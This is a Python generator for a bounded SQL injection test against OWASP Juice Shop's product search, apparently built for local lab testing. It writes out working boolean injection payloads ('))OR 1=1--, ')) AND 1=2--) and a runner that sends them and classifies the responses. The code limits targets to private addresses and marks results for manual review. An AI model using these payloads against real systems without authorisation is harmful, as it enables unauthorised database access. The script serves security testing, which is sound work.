#!/usr/bin/env python3
"""Bounded local-lab Juice Shop search-parameter SQLi boolean probe generator."""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import shlex
import sys
from pathlib import Path
from urllib.parse import urlparse

PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("<lab-ip>/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

BUNDLE_ID = "verified_lab_flow_juice_shop_search_sqli_boolean"
DEFAULT_OUTPUT_DIR = f"/tmp/{BUNDLE_ID}"


def _is_private_host(host: str) -> bool:
    if host in {"localhost", "127.0.0.1"}:
        return True
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    return any(ip in net for net in PRIVATE_NETS)


def parse_target(raw: str) -> dict:
    parsed = urlparse(raw)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise SystemExit("target must be an http(s) URL")
    if not _is_private_host(parsed.hostname):
        raise SystemExit("refusing public target: local/private lab URL required")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    base = f"{parsed.scheme}://{parsed.hostname}:{port}"
    return {"scheme": parsed.scheme, "host": parsed.hostname, "port": port, "base": base}


def classify_results(rows_by_name: dict) -> dict:
    def item(name: str) -> dict:
        return rows_by_name.get(name) or rows_by_name.get(name.replace("_probe", "")) or {}

    baseline = item("baseline_empty")
    true_row = item("boolean_true") or item("boolean_true_probe")
    false_row = item("boolean_false") or item("boolean_false_probe")
    quote_row = item("single_quote") or item("single_quote_error_probe")

    true_len = int(true_row.get("len", 0) or 0)
    false_len = int(false_row.get("len", 0) or 0)
    baseline_len = int(baseline.get("len", 0) or 0)
    quote_len = int(quote_row.get("len", 0) or 0)
    true_status = int(true_row.get("status", 0) or 0)
    false_status = int(false_row.get("status", 0) or 0)

    signals = []
    controls = []
    if true_status == false_status and true_status != 0 and abs(true_len - false_len) >= 500:
        signals.append("boolean_response_differential")
    if false_len == quote_len and false_len != 0:
        signals.append("negative_control_matches_empty_or_error_like_response")
    if true_len > baseline_len and false_len < baseline_len:
        signals.append("true_payload_expands_result_set_while_false_payload_collapses")

    noisy_keywords = False
    for row in rows_by_name.values():
        indicators = [str(x).lower() for x in row.get("indicators", [])]
        if "select" in indicators or "where" in indicators:
            noisy_keywords = True
    if noisy_keywords:
        controls.append("sql_keyword_indicators_treated_as_noisy")

    classification = "candidate_observation_only"
    if "boolean_response_differential" in signals:
        classification = "verified_lab_flow_candidate_boolean_sqli"

    return {
        "schema": "lab_sqli_boolean_classifier/0.1",
        "bundle_id": BUNDLE_ID,
        "classification": classification,
        "signals": signals,
        "controls": controls,
        "promotion": "needs_manual_review",
        "semantics": "candidate-only",
        "missing_evidence_to_confirm": [
            "manual review of exact request/response pair",
            "redacted evidence packet",
            "impact statement and remediation/retest notes",
            "report-readiness gate before public/bug-bounty use",
        ],
    }


def build_plan(target: str, output_dir: str, mode: str) -> dict:
    bits = parse_target(target)
    return {
        "schema": "lab_juice_shop_search_sqli_boolean_plan/0.1",
        "bundle_id": BUNDLE_ID,
        "mode": mode,
        "target": bits["base"],
        "target_bits": bits,
        "endpoint_path": "/rest/products/search",
        "parameters": ["q"],
        "payloads": [
            {"name": "baseline_empty", "q": "", "role": "baseline"},
            {"name": "normal_apple", "q": "apple", "role": "normal_control"},
            {"name": "single_quote", "q": "'", "role": "syntax_probe_control"},
            {"name": "boolean_true", "q": "')) OR 1=1--", "role": "positive_boolean_control"},
            {"name": "boolean_false", "q": "')) AND 1=2--", "role": "negative_boolean_control"},
        ],
        "semantics": "candidate-only",
        "owasp_mapping": [
            "A03:2021 Injection",
            "A1:2017 Injection",
            "2025 migration track: injection / query manipulation behavior",
        ],
        "source_lineage": {
            "primary": "GitHub/Arjun-inspired parameter discovery",
            "parameter_artifact": "<artifact-output-dir>/source_driven_param_discovery_fallback_retry_20260522T110522Z/",
            "proof_artifact": "<artifact-output-dir>/juice_q_sqli_bounded_wave_20260522T110815Z/",
            "policy": "source-driven tool idea -> bounded parameter discovery -> one-vulnerability boolean SQLi proof",
        },
        "oss_recon_decision": {
            "decision": "adapt/write-custom bounded runner",
            "mature_tools": [
                {"name": "Arjun", "use": "parameter discovery reference; dependency setup debt in isolated lab"},
                {"name": "sqlmap", "use": "mature SQLi verification reference; not used by default for this minimal bounded proof"},
                {"name": "OWASP ZAP", "use": "passive/active scan reference under lab gates"},
            ],
            "reason": "The source checkout was present but missing dependencies; the safe core idea was ported into a low-rate stdlib runner with controls.",
        },
        "candidate_signal": "juice_shop_search_q_boolean_sqli_candidate",
        "control_signals": [
            "normal search result is a non-exploit control",
            "boolean false payload should collapse or differ from boolean true payload",
            "generic SQL keywords in product text are noisy and not proof",
            "HTTP 200 alone is not a finding",
        ],
        "disallowed": [
            "public targets without separate written scope/rules",
            "credential theft or real-account brute force",
            "secret/loot retention",
            "destructive state change",
            "automatic confirmed finding promotion",
            "report submission",
        ],
        "output_dir": output_dir,
    }


def render_runner(plan: dict) -> str:
    plan_json = json.dumps(plan, sort_keys=True)
    output_dir = shlex.quote(plan["output_dir"])
    return rf'''#!/usr/bin/env bash
set -euo pipefail
# {BUNDLE_ID}: bounded local-lab Juice Shop search SQLi boolean probe
# Semantics: candidate-only / needs_manual_review. No credentials, loot retention, destructive state change, or finding promotion.

outdir={output_dir}
mkdir -p "$outdir"
: > "$outdir/tool_stderr.txt"
: > "$outdir/tool_stdout.txt"

python - "$outdir" <<'PY'
import hashlib, json, time, urllib.error, urllib.parse, urllib.request, sys
from pathlib import Path

outdir = Path(sys.argv[1])
plan = json.loads({plan_json!r})
base = plan['target'].rstrip('/')
endpoint = plan['endpoint_path']
rows = []

def fetch(q):
    url = base + endpoint + '?' + urllib.parse.urlencode({{'q': q}})
    req = urllib.request.Request(url, headers={{'User-Agent': 'HermesLocalLabSQLiBooleanProbe/0.1'}})
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            body = resp.read(250000)
            status = int(resp.status)
            headers = dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read(250000)
        status = int(e.code)
        headers = dict(e.headers) if e.headers else {{}}
    text = body.decode('utf-8', 'replace')
    indicators = []
    for pat in ['SQLITE_ERROR', 'SQL syntax', 'SequelizeDatabaseError', 'near', 'SELECT', 'WHERE']:
        if pat.lower() in text.lower():
            indicators.append(pat)
    return {{'url': url, 'status': status, 'headers': {{'content-type': headers.get('content-type', '')}}, 'len': len(body), 'sha256': hashlib.sha256(body).hexdigest(), 'indicators': indicators, 'sample': text[:500]}}, text

for payload in plan['payloads']:
    row, text = fetch(payload['q'])
    row.update({{'name': payload['name'], 'role': payload['role'], 'q': payload['q']}})
    rows.append(row)
    (outdir / (payload['name'] + '.body.txt')).write_text(text[:5000], encoding='utf-8')
    time.sleep(0.5)

rows_by_name = {{r['name']: r for r in rows}}

def classify(rows_by_name):
    baseline = rows_by_name.get('baseline_empty', {{}})
    true_row = rows_by_name.get('boolean_true', {{}})
    false_row = rows_by_name.get('boolean_false', {{}})
    quote_row = rows_by_name.get('single_quote', {{}})
    true_len = int(true_row.get('len', 0) or 0)
    false_len = int(false_row.get('len', 0) or 0)
    baseline_len = int(baseline.get('len', 0) or 0)
    quote_len = int(quote_row.get('len', 0) or 0)
    signals = []
    controls = []
    if int(true_row.get('status', 0) or 0) == int(false_row.get('status', 0) or 0) and abs(true_len - false_len) >= 500:
        signals.append('boolean_response_differential')
    if false_len == quote_len and false_len != 0:
        signals.append('negative_control_matches_empty_or_error_like_response')
    if true_len > baseline_len and false_len < baseline_len:
        signals.append('true_payload_expands_result_set_while_false_payload_collapses')
    if any('SELECT' in r.get('indicators', []) or 'WHERE' in r.get('indicators', []) for r in rows_by_name.values()):
        controls.append('sql_keyword_indicators_treated_as_noisy')
    classification = 'verified_lab_flow_candidate_boolean_sqli' if 'boolean_response_differential' in signals else 'candidate_observation_only'
    return {{'schema': 'lab_sqli_boolean_classifier/0.1', 'bundle_id': plan['bundle_id'], 'classification': classification, 'signals': signals, 'controls': controls, 'promotion': 'needs_manual_review', 'semantics': 'candidate-only'}}

verdict = classify(rows_by_name)
(outdir / 'results.json').write_text(json.dumps(rows, indent=2, ensure_ascii=False), encoding='utf-8')
(outdir / 'classification.json').write_text(json.dumps(verdict, indent=2, ensure_ascii=False), encoding='utf-8')
with (outdir / 'summary.txt').open('w', encoding='utf-8') as f:
    for r in rows:
        f.write(f"{{r['name']}}: status={{r['status']}} len={{r['len']}} indicators={{r['indicators']}} sha256={{r['sha256']}}\n")
    f.write(f"\nclassification={{verdict['classification']}}\n")
    f.write('promotion=needs_manual_review\n')
with (outdir / 'observations.jsonl').open('w', encoding='utf-8') as f:
    f.write(json.dumps({{'schema': 'lab_sqli_boolean_observation/0.1', 'bundle_id': plan['bundle_id'], 'endpoint': endpoint, 'parameter': 'q', 'signal': plan['candidate_signal'], 'classification': verdict['classification'], 'signals': verdict['signals'], 'controls': verdict['controls'], 'semantics': 'candidate-only', 'promotion': 'needs_manual_review'}}, sort_keys=True) + '\n')
with (outdir / 'possible_vulnerabilities.md').open('w', encoding='utf-8') as f:
    f.write(f"# {{plan['bundle_id']}} possible vulnerabilities\n\n")
    f.write('Status: candidate-only / needs_manual_review\n\n')
    f.write('## possible_manual_review_candidates\n\n')
    if verdict['classification'] == 'verified_lab_flow_candidate_boolean_sqli':
        f.write('- `/rest/products/search?q=...` shows boolean true/false response differential on `q`; review exact request/response evidence before report language.\n')
    else:
        f.write('- None from this bounded run.\n')
    f.write('\n## non_findings_or_controls\n\n')
    f.write('- Generic SQL keywords such as SELECT/WHERE are treated as noisy product-content indicators, not proof by themselves.\n')
    f.write('- HTTP 200 alone is not a finding.\n')
    f.write('\n## missing_evidence_to_confirm\n\n')
    for item in plan.get('source_lineage', {{}}).values():
        pass
    f.write('- Manual verification and redacted evidence packet.\n')
    f.write('- Impact reasoning, remediation, and retest notes.\n')
    f.write('- Report-readiness gate before public/bug-bounty use.\n')
with (outdir / 'artifact_manifest.txt').open('w', encoding='utf-8') as f:
    for name in ['results.json','classification.json','observations.jsonl','possible_vulnerabilities.md','summary.txt','tool_stdout.txt','tool_stderr.txt']:
        p = outdir / name
        f.write(f"{{name}}\t{{p.stat().st_size if p.exists() else 0}}\n")
print((outdir / 'summary.txt').read_text(encoding='utf-8'))
PY
'''


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Bounded local-lab Juice Shop search SQLi boolean probe generator.")
    ap.add_argument("--target")
    ap.add_argument("--lab-approved", action="store_true")
    ap.add_argument("--out-script", default=f"setting/local/{BUNDLE_ID}_run.sh")
    ap.add_argument("--output-dir", default=DEFAULT_OUTPUT_DIR)
    ap.add_argument("--classify-fixture", help="Offline JSON object keyed by probe name; emits classifier verdict and exits.")
    args = ap.parse_args(argv)

    if args.classify_fixture:
        fixture = json.loads(args.classify_fixture)
        print(json.dumps(classify_results(fixture), indent=2, sort_keys=True))
        return 0

    if not args.target:
        print("--target is required unless --classify-fixture is used", file=sys.stderr)
        return 2

    try:
        mode = "runnable-script" if args.lab_approved else "plan-only"
        plan = build_plan(args.target, args.output_dir, mode)
    except SystemExit as exc:
        print(str(exc), file=sys.stderr)
        return 2

    if not args.lab_approved:
        print(json.dumps(plan, indent=2, sort_keys=True))
        return 0

    out_script = Path(args.out_script)
    out_script.parent.mkdir(parents=True, exist_ok=True)
    out_script.write_text(render_runner(plan), encoding="utf-8")
    try:
        os.chmod(out_script, 0o755)
    except OSError:
        pass
    print(json.dumps({"status": "script_written", "path": str(out_script), "plan": plan}, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
